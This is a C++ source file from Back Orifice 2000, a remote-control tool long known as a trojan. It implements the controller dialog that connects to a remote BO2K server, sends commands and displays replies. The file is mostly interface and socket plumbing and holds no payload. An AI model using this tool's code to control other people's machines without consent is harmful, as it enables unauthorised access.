/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// BOServerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "bo2kgui.h"
#include "BOServerDlg.h"
#include "BODialogBar.h"
#include "MainFrm.h"
#include "QueryDlg.h"
#include "NewMachineDlg.h"
#include "resource.h"
#include <auth.h>
#include <iohandler.h>
#include <commnet.h>
#include <comm_native.h>
#include <strhandle.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define HISTORY_LENGTH 16

int g_nBOServerColor=0;

/////////////////////////////////////////////////////////////////////////////
// CBOServerDlg dialog


CBOServerDlg::CBOServerDlg(CWnd* pParent /*=NULL*/)
	: CGradientDialog(CBOServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBOServerDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_bGrad=FALSE;
	m_bGenerated=FALSE;
	m_bIsConnected=FALSE;
	m_pAuthSocket=NULL;
	m_bHandleNetwork=TRUE;
	m_cwtListenThread=NULL;
	InitializeCriticalSection(&m_NetCritSec);
}

CBOServerDlg::~CBOServerDlg()
{
	DeleteCriticalSection(&m_NetCritSec);
	if(m_cwtListenThread!=NULL) delete m_cwtListenThread;
	
}


void CBOServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CGradientDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBOServerDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBOServerDlg, CGradientDialog)
	//{{AFX_MSG_MAP(CBOServerDlg)
	ON_BN_CLICKED(IDC_DOCKING, OnAllowDocking)
	ON_BN_CLICKED(IDC_CONNECTCHECK, OnConnectcheck)
	ON_NOTIFY(TVN_SELCHANGED, IDC_SERVERCOMMANDS, OnSelchangedServercommands)
	ON_BN_CLICKED(IDC_SENDCOMMAND, OnSendcommand)
	ON_BN_CLICKED(IDC_CLEARRESPONSES, OnClearResponses)
	ON_WM_SIZE()
	ON_WM_SHOWWINDOW()
	ON_BN_CLICKED(IDC_SETTINGS, OnSettings)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBOServerDlg message handlers

void CBOServerDlg::OnOK()
{
	
}

void CBOServerDlg::OnCancel()
{

}
	
void CBOServerDlg::OnAllowDocking() 
{
	CButton *btn;
	btn=(CButton *)GetDlgItem(IDC_DOCKING);
	if(btn->GetCheck()) {
		((CBODialogBar *)GetParent())->EnableDocking(CBRS_ALIGN_ANY);	
	} else {
		((CBODialogBar *)GetParent())->EnableDocking(0);
		((CBODialogBar *)GetParent())->m_pDockContext->ToggleDocking();
	}	
}

BOOL CBOServerDlg::OnInitDialog() 
{
	CGradientDialog::OnInitDialog();
	
	m_HistFont.CreatePointFont(86,"Courier New",NULL);
	// Subclass dialog items
	m_HistEdit.SubclassDlgItem(IDC_SERVERRESPONSE,this);
	m_HistEdit.AllowSelection(TRUE);
	m_HistEdit.SetFont(&m_HistFont,TRUE);

	// Initalize command list
	m_CmdDescList.SetNativeCommands();

	CButton *dok=(CButton *)GetDlgItem(IDC_DOCKING);
	dok->SetCheck(0);
	((CBODialogBar *)GetParent())->EnableDocking(0);

	
	m_TreeImageList.Create(IDB_CMDTREE_IMAGELIST,16,8,RGB(0,255,0));

	CTreeCtrl *pTree=(CTreeCtrl *)GetDlgItem(IDC_SERVERCOMMANDS);
	pTree->SetImageList(&m_TreeImageList,TVSIL_NORMAL);
	
	m_CmdDescList.FillTreeCtrl(pTree);

	UpdateDialog();

	// Set Checks

	CButton *cqc=(CButton *)GetDlgItem(IDC_QUERYONCONNECT);
	cqc->SetCheck(1);

	// Set icons
	CButton *csb=(CButton *)GetDlgItem(IDC_SETTINGS);
	csb->SetIcon(AfxGetApp()->LoadIcon(IDI_EDITMACHINE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

BOOL CBOServerDlg::DestroyWindow() 
{
	m_bIsConnected=FALSE;
	if(m_cwtListenThread!=NULL) {
		WaitForSingleObject(m_cwtListenThread->m_hThread,INFINITE);
		delete m_cwtListenThread;
		m_cwtListenThread=NULL;
	}
	
	if(m_pAuthSocket) {
		if(m_pAuthSocket->Close()==-1) {
			AfxMessageBox("Could not close IOSocket.\nTerminating Anyway.\n");
		}
		delete m_pAuthSocket;
	}
			
	return CGradientDialog::DestroyWindow();
}

void CBOServerDlg::UpdateDialog(void)
{
	CString txt;
	txt+="  Name: ";
	txt+=m_ServerInfo.svName;
	txt+="\r\n";
	txt+="  Addr: ";
	txt+=m_ServerInfo.svAddress;

	GetDlgItem(IDC_MACHINEINFO)->SetWindowText(txt);
}

void CBOServerDlg::UseGradient(BOOL bGrad)
{
	m_bGrad=bGrad;
	if(bGrad) {
		if(!m_bGenerated) {
			COLORREF dwFace=GetSysColor(COLOR_3DFACE);
			COLORREF dwLight=GetSysColor(COLOR_3DHILIGHT);
			COLORREF dwShadow=GetSysColor(COLOR_3DSHADOW);
			COLORREF dwFadeFace=dwFace;
			COLORREF dwFadeLight=RGB(255-((255-GetRValue(dwLight))/2),
				255-((255-GetGValue(dwLight))/2),
				255-((255-GetBValue(dwLight))/2));
			COLORREF dwFadeShadow=RGB(GetRValue(dwShadow)/2,
				GetGValue(dwShadow)/2,
				GetBValue(dwShadow)/2);


			int nOrient;
			if(g_nBOServerColor==0)      { m_c1=dwFace; m_c2=dwLight; nOrient=1; }
			else if(g_nBOServerColor==1) { m_c1=dwShadow; m_c2=dwFace; nOrient=1; }
			else if(g_nBOServerColor==2) { m_c1=dwFadeFace; m_c2=dwFadeLight; nOrient=1;}
			else { m_c1=dwFadeShadow; m_c2=dwFadeFace; nOrient=1; }
			g_nBOServerColor++;
			if(g_nBOServerColor>3) g_nBOServerColor=0;
			SetGradient(m_c1,m_c2,nOrient);
			m_bGenerated=TRUE;
		}
		else m_bGradient=TRUE;
	}
	else m_bGradient=FALSE;
}


void CBOServerDlg::OnConnectcheck() 
{
	EnterCriticalSection(&m_NetCritSec);
	
	CButton *pbCC=(CButton *)GetDlgItem(IDC_CONNECTCHECK);
	CButton *pbSC=(CButton *)GetDlgItem(IDC_SENDCOMMAND);
	if(pbCC->GetCheck()) {
		pbCC->EnableWindow(FALSE);
		pbCC->SetWindowText("Connecting...");
		// Create socket and connect
	
		m_pAuthSocket=ConnectAuthSocket(NULL,0,GetSafeHwnd(),
			m_ServerInfo.svAddress,
			m_ServerInfo.svConnectionType,
			m_ServerInfo.svEncryption,
			m_ServerInfo.svAuthentication);
		if(m_pAuthSocket==NULL) {
			pbCC->SetWindowText("Connect");
			pbCC->SetCheck(0);
			pbCC->EnableWindow();
			LeaveCriticalSection(&m_NetCritSec);
			return;
		}
		if(m_pAuthSocket==(CAuthSocket *)0xFFFFFFFF) {
			m_pAuthSocket=NULL;
			pbCC->SetWindowText("Connect");
			pbCC->SetCheck(0);
			pbCC->EnableWindow();
			MessageBox("Could not connect to remote machine.\n","Connection Error",MB_ICONWARNING|MB_OK|MB_TOPMOST|MB_SETFOREGROUND);
			LeaveCriticalSection(&m_NetCritSec);
			return;
		}

		// Create socket listener thread to handle asynchronous receives.
		m_bIsConnected=TRUE;
		m_cwtListenThread=AfxBeginThread(ServerListenThread,this);
		m_cwtListenThread->m_bAutoDelete=FALSE;
		m_cwtListenThread->SetThreadPriority(THREAD_PRIORITY_LOWEST);

		if(m_cwtListenThread==NULL) {
			m_pAuthSocket->Close();
			m_bIsConnected=FALSE;
			delete m_pAuthSocket;
			m_pAuthSocket=NULL;
			pbCC->SetWindowText("Connect");
			pbCC->SetCheck(0);
			pbCC->EnableWindow();
			MessageBox("Could not create thread.\nYour system may be misbehaving.\n","System Error",MB_ICONWARNING|MB_OK|MB_TOPMOST|MB_SETFOREGROUND);
			LeaveCriticalSection(&m_NetCritSec);
			return;
		}

		// Report that we are happy			
		pbCC->SetWindowText("Disconnect");
		pbCC->EnableWindow();
		pbSC->EnableWindow();
		
		// Check for 'Auto-Query'
		CButton *cqc=(CButton *)GetDlgItem(IDC_QUERYONCONNECT);
		if(cqc->GetCheck()==1) {
			if(PerformQuery()<0) {
				MessageBox("Error sending command. Connection to remote machine may be broken.","Network Poll Error",MB_ICONSTOP|MB_OK|MB_SETFOREGROUND|MB_TOPMOST);
			}
		}
	} else {
		pbCC->EnableWindow(FALSE);
		pbCC->SetWindowText("Disconnecting...");
		
		// Close listening thread
		m_bIsConnected=FALSE;
		if(m_cwtListenThread!=NULL) {
			LeaveCriticalSection(&m_NetCritSec);
			WaitForSingleObject(m_cwtListenThread->m_hThread,INFINITE);
			EnterCriticalSection(&m_NetCritSec);
			delete m_cwtListenThread;
			m_cwtListenThread=NULL;
		}

		// Disconnect socket and destroy
		if(m_pAuthSocket->Close()==-1) {
			pbCC->SetWindowText("Disconnect");
			pbCC->SetCheck(1);
			pbCC->EnableWindow();
			MessageBox("Could not close connection.\nYour network may be misbehaving, or\nthe server has become unresponsive.\n","Network Error",MB_ICONWARNING|MB_OK|MB_TOPMOST|MB_SETFOREGROUND);
			LeaveCriticalSection(&m_NetCritSec);
			return;	
		}

		delete m_pAuthSocket;
		m_pAuthSocket=NULL;

		pbCC->SetWindowText("Connect");
		pbCC->EnableWindow();
		pbSC->EnableWindow(FALSE);
	}
	LeaveCriticalSection(&m_NetCritSec);
}


void CBOServerDlg::OnSelchangedServercommands(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	
	int command;

	command=pNMTreeView->itemNew.lParam;
	if(command==-1) {
		GetDlgItem(IDC_STATIC_OPT1)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_STATIC_OPT2)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_STATIC_OPT3)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_OPT1)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_OPT2)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_OPT3)->ShowWindow(SW_HIDE);
	}
	else {
		char *arg;
		arg=m_CmdDescList.GetArgDesc1(command);
		if(arg) {
			GetDlgItem(IDC_STATIC_OPT1)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_STATIC_OPT1)->SetWindowText(arg);
			GetDlgItem(IDC_STATIC_OPT1)->ShowWindow(SW_SHOW);
			GetDlgItem(IDC_OPT1)->ShowWindow(SW_SHOW);
		} else {
			GetDlgItem(IDC_STATIC_OPT1)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_OPT1)->ShowWindow(SW_HIDE);
		}
		
		arg=m_CmdDescList.GetArgDesc2(command);
		if(arg) {
			GetDlgItem(IDC_STATIC_OPT2)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_STATIC_OPT2)->SetWindowText(arg);
			GetDlgItem(IDC_STATIC_OPT2)->ShowWindow(SW_SHOW);
			GetDlgItem(IDC_OPT2)->ShowWindow(SW_SHOW);
		} else {
			GetDlgItem(IDC_STATIC_OPT2)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_OPT2)->ShowWindow(SW_HIDE);
		}
		
		arg=m_CmdDescList.GetArgDesc3(command);
		if(arg) {
			GetDlgItem(IDC_STATIC_OPT3)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_STATIC_OPT3)->SetWindowText(arg);
			GetDlgItem(IDC_STATIC_OPT3)->ShowWindow(SW_SHOW);
			GetDlgItem(IDC_OPT3)->ShowWindow(SW_SHOW);
		} else {
			GetDlgItem(IDC_STATIC_OPT3)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_OPT3)->ShowWindow(SW_HIDE);
		}		
	}

	*pResult = 0;
}

void CBOServerDlg::SetServerInfo(SERVER_INFO *si)
{
	m_ServerInfo=*si;
}

void CBOServerDlg::OnSendcommand() 
{
	EnterCriticalSection(&m_NetCritSec);		
	if(m_bIsConnected) {
		CTreeCtrl *pTree;
		int nCommand,ret;
		HTREEITEM hti;
		pTree=(CTreeCtrl *)GetDlgItem(IDC_SERVERCOMMANDS);
		if(pTree==NULL) {
			LeaveCriticalSection(&m_NetCritSec);		
			return;
		}
		
		hti=pTree->GetSelectedItem();
		if(hti==NULL) {
			AfxMessageBox("You need to select an appropriate command.\n",MB_OK|MB_ICONWARNING|MB_TOPMOST|MB_SETFOREGROUND);
			LeaveCriticalSection(&m_NetCritSec);		
			return;
		}
		nCommand=pTree->GetItemData(hti);
		if(nCommand==-1) {
			AfxMessageBox("You need to select an appropriate command.\n",MB_OK|MB_ICONWARNING|MB_TOPMOST|MB_SETFOREGROUND);
			LeaveCriticalSection(&m_NetCritSec);		
			return;
		}


		CEdit *pEBArg1;
		CComboBox *pCBArg2,*pCBArg3;
		int nArg1;
		char svArg1[1024],svArg2[1024],svArg3[1024];
		
		pEBArg1=(CEdit *)GetDlgItem(IDC_OPT1);
		pCBArg2=(CComboBox *)GetDlgItem(IDC_OPT2);
		pCBArg3=(CComboBox *)GetDlgItem(IDC_OPT3);
		
		// Store entries into list
		if(pEBArg1->IsWindowVisible() && pEBArg1->GetWindowTextLength()!=0) {
			pEBArg1->GetWindowText(svArg1,1024);
			nArg1=atoi(svArg1);
		}
		else nArg1=0;
		
		if(pCBArg2->IsWindowVisible() && pCBArg2->GetWindowTextLength()!=0) {
			if(pCBArg2->GetCount()==HISTORY_LENGTH) {
				pCBArg2->DeleteString(HISTORY_LENGTH-1);
			}
			pCBArg2->GetWindowText(svArg2,1024);
			pCBArg2->InsertString(0,svArg2);
		}
		else svArg2[0]='\0';
		
		if(pCBArg3->IsWindowVisible()) {
			if(pCBArg3->GetCount()==HISTORY_LENGTH) {
				pCBArg3->DeleteString(HISTORY_LENGTH-1);
			}
			pCBArg3->GetWindowText(svArg3,1024);
			pCBArg3->InsertString(0,svArg3);
		}
		else svArg3[0]='\0';
		
		// Send command
	
		switch(nCommand) {
		case BO_PING:
			ret=IssueAuthCommandRequest(m_pAuthSocket,BO_PING,GetTickCount(),0,m_ServerInfo.svAddress,NULL);
			break;
		case BO_QUERY:
			ret=PerformQuery();
			break;
		default:
			ret=IssueAuthCommandRequest(m_pAuthSocket,nCommand,GetTickCount(),nArg1,svArg2,svArg3);
			break;
		}
		if(ret<0) {
			AfxMessageBox("Error sending command. Connection to remote machine may be broken.",MB_OK|MB_ICONWARNING|MB_SETFOREGROUND|MB_TOPMOST);
		}	
	}
	LeaveCriticalSection(&m_NetCritSec);				
}

void CBOServerDlg::OnClearResponses() 
{
	// Get edit control to display response
	CHistoryEdit *pEdt=(CHistoryEdit *)GetDlgItem(IDC_SERVERRESPONSE);
	if(pEdt==NULL) return;

	pEdt->SetWindowText("");
}

UINT ServerListenThread(LPVOID pParam)
{
	CBOServerDlg *pThis=(CBOServerDlg *)pParam;
	while(pThis->m_bIsConnected) {
		pThis->HandleNetworkPoll();
		Sleep(20);
	}	

	return 0;
}

void CBOServerDlg::HandleNetworkPoll(void)
{
	BYTE *pBuffer;
	int nBufLen,ret;

	// Check connected socket
	do {
		EnterCriticalSection(&m_NetCritSec);
		ret=m_pAuthSocket->Recv(&pBuffer,&nBufLen);
		LeaveCriticalSection(&m_NetCritSec);
		if(ret<0) {
			CButton *pbCC=(CButton *)GetDlgItem(IDC_CONNECTCHECK);
			pbCC->PostMessage(BM_CLICK);
		}
		if(ret>0) {
			// Break down command into response
			int cmdlen,command,comid,nArg1;
			char *svArg2,*svArg3;
			
			BreakDownCommand(pBuffer,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
			if(svArg2!=NULL) {
				HandleCommandResponse(svArg2);
			}
			if(nArg1==2) {
				CButton *cqc=(CButton *)GetDlgItem(IDC_QUERYONCONNECT);
				if(cqc->GetCheck()==1) {
					EnterCriticalSection(&m_NetCritSec);
					if(PerformQuery()<0) {
						MessageBox("Error sending command. Connection to remote machine may be broken.","Network Poll Error",MB_ICONSTOP|MB_OK|MB_SETFOREGROUND|MB_TOPMOST);
					}
					LeaveCriticalSection(&m_NetCritSec);
				}
			}			
			m_pAuthSocket->Free(pBuffer);
		}	
	} while(ret>0);

}

void CBOServerDlg::HandleCommandResponse(char *svArg2)
{	
	// Get edit control to display response
	CHistoryEdit *pEdt=(CHistoryEdit *)GetDlgItem(IDC_SERVERRESPONSE);
	if(pEdt==NULL) return;
	
	// Get number of lines originally
	int nLineOrig=pEdt->GetLineCount();
	
	// Get original window text
	CString strText;
	pEdt->GetWindowText(strText);

	// Put append text to the edit control
	pEdt->AppendString(svArg2);
}


int CBOServerDlg::PerformQuery()
{
	int cmd_comid,nBufLen,ret;
	BYTE *pBuffer;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	
	cmd_comid=GetTickCount();
		
	ret=IssueAuthCommandRequest(m_pAuthSocket,BO_QUERY,cmd_comid,0,NULL,NULL);
	if(ret<0) {
		LeaveCriticalSection(&m_NetCritSec);		
		return -1;
	}

	QueryDlg qd;
	qd.Create(IDD_QUERYDLG,AfxGetMainWnd());
	qd.ShowWindow(SW_SHOW);

	m_CmdDescList.SetNativeCommands();
							
	// Check connected socket
	nArg1=1;
	int nQSec=0;
	do {
		MSG msg;
		if(PeekMessage(&msg,qd.GetSafeHwnd(),0,0,PM_NOREMOVE)) {
			GetMessage(&msg,qd.GetSafeHwnd(),0,0);
			DispatchMessage(&msg);
		}

		ret=m_pAuthSocket->Recv(&pBuffer,&nBufLen);
		if(ret<0) {
			m_pAuthSocket->Free(pBuffer);
			return -1;
		}
		if(ret>0) {
			
			BreakDownCommand(pBuffer,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
			if(svArg2==NULL) {
				m_pAuthSocket->Free(pBuffer);
				return -1;
			}
			
			if(command==-1 && comid==cmd_comid) {
			
				if(strncmp(svArg2,"--> Version:",12)==0) {
					nQSec=0;
					HandleCommandResponse(svArg2);
				} else if(strncmp(svArg2,"--> Extension Commands:",23)==0) {
					nQSec=1;
				} else if(strncmp(svArg2,"--> IO Handlers:",16)==0) {
					nQSec=2;
				} else if(strncmp(svArg2,"--> Encryption Handlers:",24)==0) {
					nQSec=3;
				} else if(strncmp(svArg2,"--> Auth Handlers:",18)==0) {
					nQSec=4;				
				} else {
					if(nQSec==0) {
					} else if(nQSec==1) {
						if(svArg2[0]=='(') {
							// Parse command desc string
							int nCommand=atoi(svArg2+1);
							char *svFolder,*svName,*svDesc1,*svDesc2,*svDesc3,*svEOF;
							svFolder=BreakString(svArg2,")")+1;
							svName=BreakString(svFolder,"\\");
							svDesc1=BreakString(svName,"|");
							svDesc2=BreakString(svDesc1,"|");
							svDesc3=BreakString(svDesc2,"|");
							svEOF=BreakString(svDesc3,"\n");

							// Install command
							m_CmdDescList.SetDesc(nCommand, svFolder, svName, svDesc1, svDesc2, svDesc3);
							
						}			
					} else if(nQSec==2) {
					} else if(nQSec==3) {
					} else if(nQSec==4) {
					} 
				}
				
			}
			else {	
				HandleCommandResponse(svArg2);
			}
			m_pAuthSocket->Free(pBuffer);
		}	
	} while((nArg1!=0) && !qd.m_bCanceled);

	CTreeCtrl *pTree=(CTreeCtrl *)GetDlgItem(IDC_SERVERCOMMANDS);
	pTree->SetImageList(&m_TreeImageList,TVSIL_NORMAL);
	
	m_CmdDescList.FillTreeCtrl(pTree);

	UpdateDialog();

	return 0;
}

void CBOServerDlg::OnSize(UINT nType, int cx, int cy) 
{
	CGradientDialog::OnSize(nType, cx, cy);
	
	// Calculate resize parms
	
	int nHalfX,n3Qx,nMidBottom;
	nHalfX=cx/2;
	n3Qx=(cx*3)/4;
	nMidBottom=cy*2/3;

	// Resize elements appropriately
	CWnd *pWnd;

	pWnd=GetDlgItem(IDC_SERVERRESPONSE);
	if(pWnd) pWnd->MoveWindow(CRect(5,nMidBottom,cx-5,cy-5));

	pWnd=GetDlgItem(IDC_STATIC_SERVERRESPONSE);
	if(pWnd) pWnd->MoveWindow(CRect(5,nMidBottom-16,100,nMidBottom-4));

	pWnd=GetDlgItem(IDC_CLEARRESPONSES);
	if(pWnd) pWnd->MoveWindow(cx-5-100,nMidBottom-5-22,100,22);

	pWnd=GetDlgItem(IDC_STATIC_SERVERCOMMANDS);
	if(pWnd) pWnd->MoveWindow(CRect(5,5,100,5+12));

	pWnd=GetDlgItem(IDC_SERVERCOMMANDS);
	if(pWnd) pWnd->MoveWindow(CRect(5,5+14,nHalfX,nMidBottom-14-5));

	pWnd=GetDlgItem(IDC_MACHINEINFO);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,5,cx-5-28,5+28));

	pWnd=GetDlgItem(IDC_SETTINGS);
	if(pWnd) pWnd->MoveWindow(CRect(cx-5-24,5,cx-5,5+24));

	pWnd=GetDlgItem(IDC_DOCKING);
	if(pWnd) pWnd->MoveWindow(CRect(cx-5-106,5+28+5,cx-5,5+28+5+12));

	pWnd=GetDlgItem(IDC_CONNECTCHECK);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,5+28+5,cx-5-106-5,5+28+5+27));

	pWnd=GetDlgItem(IDC_QUERYONCONNECT);
	if(pWnd) pWnd->MoveWindow(CRect(cx-5-106,5+28+5+10,cx-5,5+28+5+22+10));

	pWnd=GetDlgItem(IDC_STATIC_OPT1);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,15+56,cx-5,15+56+16));
	
	pWnd=GetDlgItem(IDC_OPT1);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,15+56+12+5,n3Qx,15+56+12+5+24));
	
	pWnd=GetDlgItem(IDC_SENDCOMMAND);
	if(pWnd) pWnd->MoveWindow(CRect(n3Qx+5,15+56+12+5,cx-5,15+56+12+5+24));
	
	pWnd=GetDlgItem(IDC_STATIC_OPT2);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,15+56+46,cx-5,15+56+46+16));
	
	pWnd=GetDlgItem(IDC_OPT2);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,15+56+46+12+5,cx-5,15+56+46+12+5+24+75));
	
	pWnd=GetDlgItem(IDC_STATIC_OPT3);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,20+56+82,cx-5,20+56+82+16));
	
	pWnd=GetDlgItem(IDC_OPT3);
	if(pWnd) pWnd->MoveWindow(CRect(nHalfX+5,20+56+82+12+5,cx-5,20+56+82+12+5+24+75));

	Invalidate();
}



void CBOServerDlg::OnSettings() 
{
	CListCtrl *list=(CListCtrl *)(((CMainFrame *)AfxGetMainWnd())->m_pWndServerList->GetDlgItem(ID_SERVERLIST));
	CNewMachineDlg nmd;
	CBOWDoc *cbd;
	SERVER_INFO *pSvr;

	cbd=(CBOWDoc *) ((CMainFrame *)theApp.GetMainWnd())->GetActiveDocument();

	int i;
	for(i=list->GetItemCount()-1;i>=0;i--) {
		pSvr=(SERVER_INFO *)list->GetItemData(i);
		if(pSvr->pServerDlg==this) break;
	}
	if(i<0) return;

	if(m_bIsConnected) {
		AfxMessageBox("The server command window is currently connected.\nDisconnect it first before editing the server parameters.",MB_OK|MB_ICONWARNING|MB_SETFOREGROUND|MB_TOPMOST);
		return;
	}

	nmd.m_strMachineName=pSvr->svName;
	nmd.m_strSvrAddr=pSvr->svAddress;
	nmd.m_strSelectedIO=pSvr->svConnectionType;
	nmd.m_strSelectedEnc=pSvr->svEncryption;
	nmd.m_strSelectedAuth=pSvr->svAuthentication;
	if(nmd.DoModal()==IDOK) {
		cbd->EditServer(pSvr,nmd.m_strMachineName,nmd.m_strSelectedIO,nmd.m_strSvrAddr,nmd.m_strSelectedEnc,nmd.m_strSelectedAuth);
		((CMainFrame *)AfxGetMainWnd())->m_pWndServerList->SynchToDocument(cbd);
	}
	pSvr->pServerDlgBDB->Invalidate();
	pSvr->pServerDlgBDB->UpdateWindow();
	Invalidate();
	UpdateWindow();	
}
